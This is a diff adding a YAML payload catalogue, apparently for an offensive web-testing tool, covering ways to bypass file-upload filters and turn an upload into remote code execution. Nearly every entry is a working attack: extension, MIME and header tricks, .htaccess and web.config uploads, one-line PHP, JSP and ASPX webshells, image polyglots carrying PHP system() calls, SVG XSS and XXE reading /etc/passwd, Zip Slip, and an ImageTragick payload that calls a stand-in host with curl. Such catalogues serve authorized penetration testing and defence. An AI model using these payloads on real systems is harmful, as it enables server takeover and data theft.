@@ -1,0 +1,271 @@
+id: file_upload_bypass
+name: File Upload Filter Bypass
+version: 1.0.0
+category: misconfiguration
+description: |
+  Techniques and payloads for bypassing file-upload restrictions and weaponising
+  arbitrary uploads into RCE: extension blocklist bypass, MIME confusion,
+  magic-byte spoofing, polyglot files, and webshells per stack.
+mitre:
+  - T1505.003
+  - T1190
+owasp_top10:
+  - A05:2021
+  - A04:2021
+references:
+  - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  - https://book.hacktricks.xyz/pentesting-web/file-upload
+  - https://github.com/almandin/fuxploider
+related_tools:
+  - fuxploider
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: double_ext_php
+    name: Double extension .php.jpg
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php, apache]
+    severity_when_works: critical
+    payload: |
+      filename="shell.php.jpg"
+    notes: Apache mod_mime sometimes picks left-most known ext
+    source: https://book.hacktricks.xyz/pentesting-web/file-upload
+  - id: alt_ext_phtml
+    name: Alternate .phtml extension
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      filename="shell.phtml"
+    notes: Often missing from blocklists
+    source: common knowledge
+  - id: alt_ext_phar
+    name: .phar extension
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      filename="shell.phar"
+    notes: Executed by PHP when accessed
+    source: common knowledge
+  - id: alt_ext_pht
+    name: .pht extension
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: high
+    payload: |
+      filename="shell.pht"
+    notes: null
+    source: common knowledge
+  - id: alt_ext_php5
+    name: .php5 / .php7 extension
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      filename="shell.php5"
+    notes: null
+    source: common knowledge
+  - id: null_byte
+    name: Null-byte extension truncation
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      filename="shell.php%00.jpg"
+    notes: PHP < 5.3.4
+    source: https://book.hacktricks.xyz/pentesting-web/file-upload
+  - id: case_variant
+    name: Case-variant extension
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: high
+    payload: |
+      filename="shell.PhP"
+    notes: For case-sensitive blocklists
+    source: common knowledge
+  - id: trailing_dot
+    name: Trailing dot/space
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [windows, iis]
+    severity_when_works: high
+    payload: |
+      filename="shell.php."
+    notes: Windows strips trailing dots
+    source: common knowledge
+  - id: htaccess
+    name: .htaccess upload
+    subcategory: htaccess
+    encoding: raw
+    tech_targets: [apache]
+    severity_when_works: critical
+    payload: |
+      AddType application/x-httpd-php .jpg
+    notes: Then upload shell.jpg
+    source: https://book.hacktricks.xyz/pentesting-web/file-upload
+  - id: web_config
+    name: web.config upload (IIS)
+    subcategory: web_config
+    encoding: raw
+    tech_targets: [iis]
+    severity_when_works: critical
+    payload: |
+      <configuration><system.webServer><handlers accessPolicy="Read, Script, Write"><add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /></handlers></system.webServer></configuration>
+    notes: For ASP/IIS misconfig
+    source: https://soroush.secproject.com/blog/2014/07/upload-web-config-for-fun-profit/
+  - id: mime_swap
+    name: MIME header swap
+    subcategory: mime_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Content-Type: image/jpeg
+    notes: Set MIME to image even when sending .php body
+    source: common knowledge
+  - id: magic_bytes_jpg
+    name: JPEG magic prefix + PHP
+    subcategory: polyglot
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      \xff\xd8\xff\xe0<?php system($_GET['c']); ?>
+    notes: getimagesize() passes
+    source: https://book.hacktricks.xyz/pentesting-web/file-upload
+  - id: magic_bytes_png
+    name: PNG magic prefix + PHP
+    subcategory: polyglot
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      \x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>
+    notes: null
+    source: common knowledge
+  - id: gif_polyglot
+    name: GIF polyglot with PHP comment
+    subcategory: polyglot
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      GIF89a; <?php system($_GET['c']); ?>
+    notes: null
+    source: common knowledge
+  - id: svg_xss
+    name: SVG with embedded XSS
+    subcategory: svg
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0" standalone="no"?>
+      <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" width="200" height="200"/>
+    notes: Stored XSS via image upload
+    source: https://book.hacktricks.xyz/pentesting-web/file-upload
+  - id: svg_xxe
+    name: SVG XXE
+    subcategory: svg
+    encoding: raw
+    tech_targets: [java, php]
+    severity_when_works: high
+    payload: |
+      <?xml version="1.0" standalone="yes"?>
+      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+    notes: When server renders SVG as XML
+    source: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  - id: php_shell_minimal
+    name: Minimal PHP webshell
+    subcategory: webshell
+    encoding: raw
+    tech_targets: [php]
+    severity_when_works: critical
+    payload: |
+      <?=`$_GET[0]`?>
+    notes: null
+    source: common knowledge
+  - id: jsp_shell
+    name: JSP webshell
+    subcategory: webshell
+    encoding: raw
+    tech_targets: [java]
+    severity_when_works: critical
+    payload: |
+      <% Runtime.getRuntime().exec(request.getParameter("c")); %>
+    notes: null
+    source: common knowledge
+  - id: aspx_shell
+    name: ASPX webshell
+    subcategory: webshell
+    encoding: raw
+    tech_targets: [aspnet]
+    severity_when_works: critical
+    payload: |
+      <%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd", "/c " + Request["c"]); %>
+    notes: null
+    source: common knowledge
+  - id: cmd_zip_slip
+    name: Zip Slip path traversal
+    subcategory: zip_slip
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      Inside zip: entry named "../../../../tmp/pwn.txt"
+    notes: For extractors that don't sanitise
+    source: https://snyk.io/research/zip-slip-vulnerability
+  - id: extension_long_name
+    name: Long-name truncation
+    subcategory: extension_bypass
+    encoding: raw
+    tech_targets: [windows]
+    severity_when_works: medium
+    payload: |
+      filename="shell.php" + 300 bytes
+    notes: Truncated by NTFS limit
+    source: common knowledge
+  - id: content_disposition_quote
+    name: Content-Disposition quote inject
+    subcategory: mime_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Content-Disposition: form-data; name="file"; filename="shell.jpg\"; pwn=1; filename=\"shell.php"
+    notes: Some parsers prefer the second filename
+    source: common knowledge
+  - id: image_magick_yaml
+    name: ImageTragick MVG
+    subcategory: chained_rce
+    encoding: raw
+    tech_targets: [imagemagick]
+    severity_when_works: critical
+    payload: |
+      push graphic-context
+      viewbox 0 0 640 480
+      fill 'url(https://OOB.example.net/x.jpg"|curl OOB.example.net/im)'
+      pop graphic-context
+    notes: CVE-2016-3714
+    source: https://imagetragick.com/
+  - id: fuxploider_invocation
+    name: fuxploider tool invocation
+    subcategory: tool_invoke
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      python3 fuxploider.py --url https://target.example.net/upload --not-regex "fail"
+    notes: null
+    source: https://github.com/almandin/fuxploider
